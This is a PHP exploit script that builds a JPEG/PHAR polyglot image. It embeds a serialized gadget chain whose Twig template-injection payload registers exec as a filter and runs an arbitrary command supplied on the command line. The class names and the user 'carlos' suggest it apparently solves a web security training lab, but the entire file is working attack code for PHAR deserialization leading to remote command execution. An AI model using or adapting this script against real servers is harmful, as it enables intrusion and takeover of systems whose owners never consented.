<?php

// inspired ( ͡° ͜ʖ ͡°) by https://github.com/kunte0/phar-jpg-polyglot

// uncomment (;) and set phar.readonly = Off in php.ini
// php --ini to find file location


function generate_base_phar($o){
    global $tempname;
    @unlink($tempname);
    $phar = new Phar($tempname);
    $phar->startBuffering();
    $phar->addFromString("test.txt", "test");
    $phar->setStub("<?php __HALT_COMPILER(); ?>");
    $phar->setMetadata($o);
    $phar->stopBuffering();

    $basecontent = file_get_contents($tempname);
    @unlink($tempname);
    return $basecontent;
}

function generate_polyglot($phar, $jpeg){
    $phar = substr($phar, 6); // remove <?php dosent work with prefix
    $len = strlen($phar) + 2; // fixed
    $new = substr($jpeg, 0, 2) . "\xff\xfe" . chr(($len >> 8) & 0xff) . chr($len & 0xff) . $phar . substr($jpeg, 2);
    $contents = substr($new, 0, 148) . "        " . substr($new, 156);

    // calc tar checksum
    $chksum = 0;
    for ($i=0; $i<512; $i++){
        $chksum += ord(substr($contents, $i, 1));
    }
    // embed checksum
    $oct = sprintf("%07o", $chksum);
    $contents = substr($contents, 0, 148) . $oct . substr($contents, 155);
    return $contents;
}


// exploit object

class Blog {}
$blog = new Blog;
$blog->user = 'carlos';
$blog->desc = "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"{$argv[1]}\")}}";
class CustomTemplate {}
$template = new CustomTemplate;
$template->template_file_path = $blog;

var_dump(serialize($template));

// config for jpg
$tempname = 'temp.tar.phar'; // make it tar
$jpeg = file_get_contents('in.jpg');
$outfile = 'out.jpg';

@unlink($outfile);
// make jpg
file_put_contents($outfile, generate_polyglot(generate_base_phar($template), $jpeg));

?>
